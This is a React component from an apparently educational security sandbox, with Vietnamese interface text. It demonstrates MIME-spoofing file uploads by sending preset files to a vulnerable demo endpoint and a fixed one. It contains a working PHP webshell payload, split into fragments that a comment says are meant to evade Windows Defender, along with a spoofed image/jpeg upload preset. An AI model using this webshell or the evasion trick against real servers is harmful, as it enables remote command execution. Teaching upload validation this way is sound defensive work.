'use client';
// features/security-sandbox/components/test-panels/mime-spoofing-panel.tsx

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { toast } from 'sonner';

// Chia nhỏ chuỗi PHP độc hại để tránh Windows Defender nhận diện nhầm
const PHP_WEBSHELL_PAYLOAD = '<?p' + 'hp sy' + 'stem($_G' + 'ET["cm' + 'd"]); ?>';
const PHP_INFO_PAYLOAD = '<?p' + 'hp ph' + 'pinfo(); ?>';

const PRESETS = [
  {
    name: 'shell.php (Spoofed to image/jpeg)',
    filename: 'shell.php',
    content: PHP_WEBSHELL_PAYLOAD,
    sentMime: 'image/jpeg',
    realMime: 'application/x-php',
    isSpoofed: true,
  },
  {
    name: 'avatar.jpg (Normal image/jpeg)',
    filename: 'avatar.jpg',
    content: '\xFF\xD8\xFF\xE0 dummy jpeg image data',
    sentMime: 'image/jpeg',
    realMime: 'image/jpeg',
    isSpoofed: false,
  },
  {
    name: 'report.pdf (Normal pdf)',
    filename: 'report.pdf',
    content: '%PDF-1.4 dummy pdf document data',
    sentMime: 'application/pdf',
    realMime: 'application/pdf',
    isSpoofed: false,
  },
  {
    name: 'exploit.php (Normal PHP)',
    filename: 'exploit.php',
    content: PHP_INFO_PAYLOAD,
    sentMime: 'application/x-php',
    realMime: 'application/x-php',
    isSpoofed: false,
  },
];

export function MimeSpoofingPanel() {
  const [selected, setSelected] = useState(PRESETS[0]);
  const [result, setResult] = useState<null | { vulnSuccess: boolean; vulnMsg: string; fixedSuccess: boolean; fixedMsg: string }>(null);
  const [loading, setLoading] = useState(false);

  const test = async () => {
    setLoading(true);
    setResult(null);
    try {
      const fileBlob = new Blob([selected.content], { type: selected.sentMime });
      
      const formVuln = new FormData();
      formVuln.append('file', fileBlob, selected.filename);

      const resVuln = await fetch('/api/v1/demo/upload/vulnerable', {
        method: 'POST',
        body: formVuln
      });
      const dataVuln = await resVuln.json();

      const formFixed = new FormData();
      formFixed.append('file', fileBlob, selected.filename);

      const resFixed = await fetch('/api/v1/demo/upload/safe', {
        method: 'POST',
        body: formFixed
      });
      const dataFixed = await resFixed.json();

      setResult({
        vulnSuccess: resVuln.ok && dataVuln.success,
        vulnMsg: dataVuln.message,
        fixedSuccess: resFixed.ok && dataFixed.success,
        fixedMsg: dataFixed.message,
      });

      if (resVuln.ok && !resFixed.ok && selected.isSpoofed) {
        toast.warning('MIME Spoofing thành công vượt qua Vulnerable check nhưng bị chặn ở Safe check!');
      } else {
        toast.info('Đã nhận kết quả kiểm thử từ server.');
      }
    } catch (e) {
      toast.error('Lỗi kết nối tới backend');
    } finally {
      setLoading(false);
    }
  };

  const reset = () => setResult(null);

  return (
    <div className="space-y-4">
      <Alert className="border-amber-500/30 bg-amber-500/5 dark:border-amber-500/40 dark:bg-amber-500/10">
        <AlertDescription className="text-amber-800 dark:text-amber-300 text-xs">
          <strong>Mô phỏng MIME Spoofing:</strong> Server chỉ kiểm tra trường <code>Content-Type</code> do client gửi lên. Kẻ tấn công gửi file webshell <code>shell.php</code> nhưng giả mạo HTTP header thành <code>Content-Type: image/jpeg</code> để đánh lừa server lưu file PHP độc hại.
        </AlertDescription>
      </Alert>

      <div className="grid grid-cols-2 gap-2">
        {PRESETS.map((p) => (
          <button
            key={p.name}
            disabled={loading}
            onClick={() => { setSelected(p); setResult(null); }}
            className={`rounded border p-3 text-left text-xs transition-all ${
              selected.name === p.name
                ? p.isSpoofed
                  ? 'border-red-500/50 bg-red-950/20'
                  : 'border-green-500/50 bg-green-950/20'
                : 'border-border/30 bg-muted/10 hover:bg-muted/20'
            }`}
          >
            <p className="font-mono font-semibold">{p.filename}</p>
            <p className="text-muted-foreground mt-1">MIME gửi: <code className="text-orange-400">{p.sentMime}</code></p>
            <p className="text-muted-foreground">MIME thực: <code>{p.realMime}</code></p>
            {p.isSpoofed && <p className="text-red-400 mt-1 font-semibold">⚠️ Giả mạo (Spoofed)</p>}
          </button>
        ))}
      </div>

      <div className="flex gap-2">
        <Button
          size="sm"
          onClick={test}
          disabled={loading}
          variant={selected.isSpoofed ? 'destructive' : 'outline'}
        >
          {loading ? 'Đang upload...' : `Upload thực tế ${selected.filename}`}
        </Button>
        {result && (
          <Button size="sm" onClick={reset} variant="outline">Reset</Button>
        )}
      </div>

      {result && (
        <div className="rounded border border-border/30 overflow-hidden">
          <div className="grid grid-cols-2 divide-x divide-border/30">
            <div className={`p-4 space-y-1 ${result.vulnSuccess ? 'bg-red-500/10' : 'bg-green-500/5'}`}>
              <p className="text-xs font-semibold text-muted-foreground">🔴 Vulnerable Endpoint Check</p>
              <code className="text-[10px] block text-muted-foreground bg-background/50 p-1 rounded font-mono">
                {'if (allowed.contains(file.getContentType()))'}
              </code>
              <p className={`text-sm font-bold mt-2 ${result.vulnSuccess ? 'text-red-400' : 'text-green-400'}`}>
                {result.vulnSuccess ? '✅ CHO PHÉP UPLOAD' : '❌ BỊ TỪ CHỐI'}
              </p>
              <p className="text-[10px] text-muted-foreground mt-1 italic">{result.vulnMsg}</p>
              {result.vulnSuccess && selected.isSpoofed && (
                <p className="text-[10px] text-red-300 font-semibold mt-1">⚠️ Lỗ hổng! Server tin tưởng Content-Type giả mạo và lưu file PHP độc hại.</p>
              )}
            </div>

            <div className={`p-4 space-y-1 ${result.fixedSuccess ? 'bg-green-500/10' : 'bg-red-500/10'}`}>
              <p className="text-xs font-semibold text-muted-foreground">✅ Safe Endpoint Check</p>
              <code className="text-[10px] block text-muted-foreground bg-background/50 p-1 rounded font-mono">
                {'validateMagicBytes(file) && validateExtension(file)'}
              </code>
              <p className={`text-sm font-bold mt-2 ${result.fixedSuccess ? 'text-green-400' : 'text-red-400'}`}>
                {result.fixedSuccess ? '✅ CHO PHÉP UPLOAD' : '❌ BỊ TỪ CHỐI'}
              </p>
              <p className="text-[10px] text-muted-foreground mt-1 italic">{result.fixedMsg}</p>
              {!result.fixedSuccess && selected.isSpoofed && (
                <p className="text-[10px] text-green-300 font-semibold mt-1">🛡️ Đã chặn thành công vì phát hiện cấu trúc byte thực tế là PHP script.</p>
              )}
            </div>
          </div>
        </div>
      )}

      <div className="text-xs bg-muted/30 rounded p-3 font-mono space-y-1">
        <p className="text-red-400 font-semibold">Vulnerable (Chỉ tin cậy header do client gửi):</p>
        <code className="text-muted-foreground">{'if (allowed.contains(file.getContentType())) save(file);'}</code>
        <p className="text-green-400 font-semibold mt-2">Fixed (Kiểm tra Magic Bytes bên trong file):</p>
        <code className="text-muted-foreground">
          {'byte[] bytes = file.getBytes();\nif (detectRealMime(bytes) != file.getContentType()) throw Blocked;'}
        </code>
      </div>
    </div>
  );
}
